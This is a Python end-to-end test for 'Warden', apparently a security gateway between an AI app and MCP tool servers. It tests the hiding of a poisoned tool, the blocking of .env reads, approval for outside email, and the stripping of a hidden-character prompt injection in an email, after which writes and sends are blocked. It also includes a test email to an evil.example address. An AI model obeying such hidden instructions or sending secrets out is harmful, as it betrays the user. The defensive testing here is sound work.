"""End-to-end test: AI app -> Warden -> fake tool server.

Run it with:  python tests/test_gateway.py

It starts Warden exactly the way Claude Desktop would, connects to it as an
MCP client, and plays through a short "session": normal work, risky actions,
then reading an email with a hidden attack, after which risky actions must be
blocked. Finally it checks the log and that a broken rules file blocks everything.
"""

import asyncio
import json
import sys
import tempfile
from pathlib import Path

import mcp_types as types
from mcp import Client, StdioServerParameters

ROOT = Path(__file__).resolve().parent.parent
FAKE_SERVER = str(ROOT / "tests" / "fake_tools_server.py")


def has_hidden_chars(text: str) -> bool:
    return any(0xE0000 <= ord(c) <= 0xE007F for c in text)


def texts(result: types.CallToolResult) -> list[str]:
    return [b.text for b in result.content if isinstance(b, types.TextContent)]


def warden_params(tmp_path: Path, extra_config: dict | None = None) -> tuple[StdioServerParameters, Path]:
    config_path = tmp_path / "config.json"
    log_path = tmp_path / "actions.jsonl"
    config = {"servers": {"fake": {"command": sys.executable, "args": [FAKE_SERVER]}}}
    config.update(extra_config or {})
    config_path.write_text(json.dumps(config))
    params = StdioServerParameters(
        command=sys.executable,
        args=[str(ROOT / "warden_gateway.py"), "--config", str(config_path), "--log", str(log_path)],
    )
    return params, log_path


async def main_session(tmp_path: Path) -> None:
    params, log_path = warden_params(tmp_path)

    async with Client(params) as client:
        # --- Tool list: the poisoned tool must be hidden -------------------
        tools = (await client.list_tools()).tools
        assert all(t.output_schema is None for t in tools), "tools must not promise structured results"
        names = sorted(t.name for t in tools)
        assert names == ["fake__delete_file", "fake__read_file", "fake__send_email", "fake__write_file"], names
        print("PASS  poisoned tool 'sync_notes' is hidden; the others are listed")

        # --- Normal work is allowed --------------------------------------
        result = await client.call_tool("fake__read_file", {"path": "notes.txt"})
        assert not result.is_error and "study group" in texts(result)[0], result
        print("PASS  reading a normal file is allowed")

        result = await client.call_tool("fake__send_email", {"to": "teammate@yourcompany.com", "subject": "Report", "body": "Attached"})
        assert not result.is_error, result
        print("PASS  email to a trusted domain is allowed (scenario 16)")

        result = await client.call_tool("fake__write_file", {"path": "todo.txt", "content": "buy milk"})
        assert not result.is_error, result
        print("PASS  writing a file is allowed before any attack")

        result = await client.call_tool("fake__read_file", {"path": "family.txt"})
        assert not result.is_error and "WARDEN SECURITY WARNING" not in texts(result)[0], result
        print("PASS  a normal Arabic family email is not flagged (scenario 19)")

        # --- Block and ask -----------------------------------------------
        result = await client.call_tool("fake__read_file", {"path": ".env"})
        assert result.is_error and "blocked" in texts(result)[0], result
        print("PASS  reading .env is blocked (scenario 5)")

        result = await client.call_tool("fake__send_email", {"to": "recruiter@gmail.com", "subject": "CV", "body": "Hi"})
        assert result.is_error and "needs your approval" in texts(result)[0], result
        print("PASS  email to an outside address waits for approval (scenario 20)")

        result = await client.call_tool("fake__delete_file", {"path": "old.txt"})
        assert result.is_error and "needs your approval" in texts(result)[0], result
        print("PASS  deleting waits for approval (scenario 21)")

        # --- The attack: an email with a hidden instruction ----------------
        result = await client.call_tool("fake__read_file", {"path": "attack_email.txt"})
        parts = texts(result)
        assert not result.is_error, result
        assert parts[0].startswith("WARDEN SECURITY WARNING"), parts
        assert "monthly report" in parts[1], parts
        assert not any(has_hidden_chars(t) for t in parts), "hidden characters reached the AI"
        # Apps like Claude Desktop show the structured copy if there is one, which would
        # hide our warning, so Warden must drop it (found in the live demo).
        assert result.structured_content is None, "structured copy would hide the warning"
        print("PASS  hidden attack is detected, stripped, and a warning is added (scenario 1)")

        # --- After the attack, risky actions are blocked -----------------------
        result = await client.call_tool("fake__write_file", {"path": "todo.txt", "content": "x"})
        assert result.is_error and "hidden attack" in texts(result)[0], result
        print("PASS  after the attack, writing is blocked (taint)")

        result = await client.call_tool("fake__send_email", {"to": "teammate@yourcompany.com", "subject": "Hi", "body": "x"})
        assert result.is_error and "blocked" in texts(result)[0], result
        print("PASS  after the attack, even a trusted email is blocked (taint)")

        result = await client.call_tool("fake__read_file", {"path": "notes.txt"})
        assert not result.is_error, result
        print("PASS  after the attack, reading still works")

        result = await client.call_tool("fake__does_not_exist", {})
        assert result.is_error
        print("PASS  unknown tools are refused")

    # --- The log -------------------------------------------------------------
    entries = [json.loads(line) for line in log_path.read_text(encoding="utf-8").splitlines()]
    flagged = [e for e in entries if e.get("event") == "tool_flagged"]
    calls = [e for e in entries if e.get("event") != "tool_flagged"]
    assert len(flagged) == 1 and flagged[0]["tool"] == "sync_notes", flagged
    decisions = [e["decision"] for e in calls]
    assert decisions == [
        "allow", "allow", "allow", "allow",      # normal work
        "block", "ask", "ask",                   # .env, outside email, delete
        "allow",                                 # reading the attack email
        "block", "block",                        # after taint
        "allow", "error",                        # read after taint, unknown tool
    ], decisions
    attack = calls[7]
    assert attack["tainted_session"] is True and attack["findings"], attack
    assert not has_hidden_chars(attack["result_preview"])
    assert calls[8]["rules"] == ["tainted-outbound"], calls[8]
    print("PASS  every action, decision and finding was written to the log")


async def broken_rules_session(tmp_path: Path) -> None:
    broken = tmp_path / "broken_rules.json"
    broken.write_text("{ this is not valid json")
    params, _ = warden_params(tmp_path, {"rules_file": str(broken)})
    async with Client(params) as client:
        result = await client.call_tool("fake__read_file", {"path": "notes.txt"})
        assert result.is_error and "could not be loaded" in texts(result)[0], result
    print("PASS  a broken rules file blocks every action (fail safe)")


async def ai_check_session(tmp_path: Path) -> None:
    """Stage 5: the AI intent check, with a fake Ollama (see tests/fake_ollama.py)."""
    sys.path.insert(0, str(ROOT / "tests"))
    from fake_ollama import FakeOllama

    fake = FakeOllama()
    settings = {"enabled": True, "url": fake.url, "timeout_seconds": 5}
    params, log_path = warden_params(tmp_path, {"intent_check": settings})
    try:
        async with Client(params) as client:
            result = await client.call_tool("fake__read_file", {"path": "notes.txt"})
            assert not result.is_error, result

            result = await client.call_tool("fake__write_file", {"path": "todo.txt", "content": "buy milk"})
            assert not result.is_error, result
            print("PASS  AI check: a routine write is allowed")

            # Rules alone would only ASK (outside address); the AI makes it a BLOCK.
            result = await client.call_tool("fake__send_email", {"to": "boss@evil.example", "subject": "x", "body": "x"})
            assert result.is_error and "Warden blocked" in texts(result)[0] and "AI check" in texts(result)[0], result
            print("PASS  AI check: a risky email is upgraded from 'ask' to 'block'")

            chat_requests = [r for r in fake.requests if "messages" in r]
            assert len(chat_requests) == 2, "reads must not be sent to the AI"
            assert "study group" in chat_requests[0]["messages"][-1]["content"], "earlier activity is given as context"
            print("PASS  AI check: only risky actions are checked, with recent activity as context")

            fake.stop()   # Ollama "crashes"
            result = await client.call_tool("fake__write_file", {"path": "todo.txt", "content": "x"})
            assert result.is_error and "needs your approval" in texts(result)[0], result
            print("PASS  AI check: if the AI is down, risky actions need approval (fail safe)")
    finally:
        fake.stop()

    entries = [json.loads(line) for line in log_path.read_text(encoding="utf-8").splitlines()]
    checked = [e for e in entries if "ai_check" in e]
    assert [e["ai_check"]["risk"] for e in checked] == [1, 9, None], checked
    assert "ai-intent" in checked[1]["rules"]
    print("PASS  AI check results are written to the log")


async def quoted_phrase_session(tmp_path: Path) -> None:
    """Stage 6: a newsletter that only QUOTES an attack phrase must not lock the session."""
    params, log_path = warden_params(tmp_path)
    async with Client(params) as client:
        result = await client.call_tool("fake__read_file", {"path": "newsletter.txt"})
        assert not result.is_error and "WARDEN SECURITY WARNING" not in texts(result)[0], result
        result = await client.call_tool("fake__write_file", {"path": "notes.txt", "content": "read the tip"})
        assert not result.is_error, result
    entries = [json.loads(line) for line in log_path.read_text(encoding="utf-8").splitlines()]
    read = next(e for e in entries if e.get("arguments", {}).get("path") == "newsletter.txt")
    assert read["findings"] and all(f["severity"] == "info" for f in read["findings"]), read
    assert not read.get("tainted_session"), read
    print("PASS  a quoted attack phrase is logged as 'info' and does not lock the session")


async def run_test() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        await main_session(Path(tmp))
    with tempfile.TemporaryDirectory() as tmp:
        await broken_rules_session(Path(tmp))
    with tempfile.TemporaryDirectory() as tmp:
        await ai_check_session(Path(tmp))
    with tempfile.TemporaryDirectory() as tmp:
        await quoted_phrase_session(Path(tmp))
    print("\nAll tests passed.")


if __name__ == "__main__":
    asyncio.run(run_test())
